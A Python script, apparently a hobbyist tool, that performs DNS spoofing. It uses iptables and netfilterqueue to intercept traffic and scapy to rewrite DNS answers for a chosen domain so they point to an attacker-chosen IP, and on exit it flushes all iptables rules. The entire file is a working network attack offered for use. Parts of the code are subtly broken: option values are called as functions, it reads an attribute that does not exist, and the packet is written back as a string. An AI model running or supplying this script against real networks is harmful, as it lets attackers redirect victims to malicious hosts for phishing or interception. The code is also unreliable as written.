#!/usr/share/python3 

import subprocess
import scapy.all as scapy
import netfilterqueue
import optparse

def iptables(local_test):

    if local_test == "true":
        subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
        subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
    else:
        subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])
        

def get_arguements():

    parser = optparse.OptionParser()

    parser.add_option("-s", "--spoof", help="To specify the spoof IP Address", dest="spoof")
    parser.add_option("-d", "--domain", help="To specify the domain name to spoof", dest="domain")
    parser.add_option("-l", "--local", help="To specify if the DNS spoofing has to be tested locally on this computer itself", dest="local")

    (options, arguements) = parser.parse_args()

    if not options.spoof():
        parser.error("[-] Please specify the spoof IP")
    
    if not options.domain():
        parser.error("[-] Please specify the domain to spoof")

    return options

def process_packets(packet):

    options = get_arguements()
    scapy_packets = scapy.IP(packet.get_payload())
    if scapy_packets.haslayer(scapy.DNSRR):
        qname = scapy_packets[scapy.DNSQR].qname
        if options.domain in str(qname):
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.spoof)

            scapy_packets[scapy.DNS].an = answer
            scapy_packets[scapy.DNS].ancount = 1 

            del scapy_packets[scapy.IP].len
            del scapy_packets[scapy.IP].chksum
            del scapy_packets[scapy.UDP].len
            del scapy_packets[scapy.UDP].chksum
            packet.set_payload(str(scapy_packets))

    packet.accept()

try:
    options = get_arguements()
    local_test = options.local_test

    if options.local():
        local_test = "true"
    iptables(local_test)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    queue.run()

except KeyboardInterrupt:
    print("CTRL + C detected .... clearing IP Tables")
    subprocess.call(['iptables', '--flush'])
